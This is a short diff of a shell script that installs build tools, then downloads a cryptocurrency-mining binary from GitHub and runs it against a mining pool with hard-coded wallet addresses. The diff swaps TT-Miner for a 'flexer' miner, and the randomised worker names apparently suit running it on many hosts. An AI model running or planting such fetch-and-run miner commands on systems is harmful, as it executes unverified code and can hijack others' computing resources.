@@ -2,8 +2,6 @@
 apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
 apt install curl libssl1.0-dev
 apt install libjansson-dev libjansson4 -y
-wget https://github.com/TrailingStop/TT-Miner-release/releases/download/2024.3.2/TT-Miner-2024.3.2.tar.gz
-tar xvf TT-Miner-2024.3.2.tar.gz
-cd TT-Miner-2024.3.2
-chmod +x TT-Miner
-./TT-Miner -a Flex -o stratum+tcp://64.23.144.233:443 -u KCN=kc1qylrmtzw47wldzzgwfkxtgrhgvp8jnyrck33nqu,LCN=lc1q96e9tef6vxplrs8txcrp200l3nshywg70hltfh
+wget https://github.com/flexminer24/flexer/releases/download/v0.1.8/flexer-avx2-sha.tar.gz
+tar -xvf ./flexer-avx2-sha.tar.gz
+./flexer-avx2-sha --url us-west.mining4people.com:3449 --user kc1qylrmtzw47wldzzgwfkxtgrhgvp8jnyrck33nqu.$(echo $(shuf -i 1000-9999 -n 1)-cok) -p x
